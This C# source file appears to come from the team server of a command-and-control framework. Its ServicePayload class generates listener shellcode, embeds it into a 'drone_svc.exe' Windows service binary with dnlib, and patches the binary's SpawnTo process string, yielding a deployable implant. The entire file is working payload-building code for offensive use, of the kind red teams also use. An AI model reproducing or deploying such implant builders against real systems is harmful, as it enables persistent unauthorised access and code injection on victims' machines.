using System.IO;
using System.Linq;
using System.Threading.Tasks;

using dnlib.DotNet;
using dnlib.DotNet.Emit;

namespace TeamServer.Models
{
    public class ServicePayload : Payload
    {
        public string SpawnTo { get; set; }
        
        public override async Task Generate()
        {
            var shellcode = new RawPayload { Handler = Handler };
            await shellcode.Generate();

            var svcBinary = await Utilities.GetEmbeddedResource("drone_svc.exe");
            
            var module = ModuleDefMD.Load(svcBinary);
            module.Resources.Add(new EmbeddedResource("drone", shellcode.Bytes));

            var type = module.Types.GetType("Service");
            var method = type.Methods.GetMethod("SpawnTo");

            var instruction = method.Body.Instructions.FirstOrDefault(i => i.OpCode == OpCodes.Ldstr);
            
            if (instruction is not null)
                instruction.Operand = SpawnTo;
            
            await using var ms = new MemoryStream();
            module.Write(ms);
            Bytes = ms.ToArray();
        }
    }
}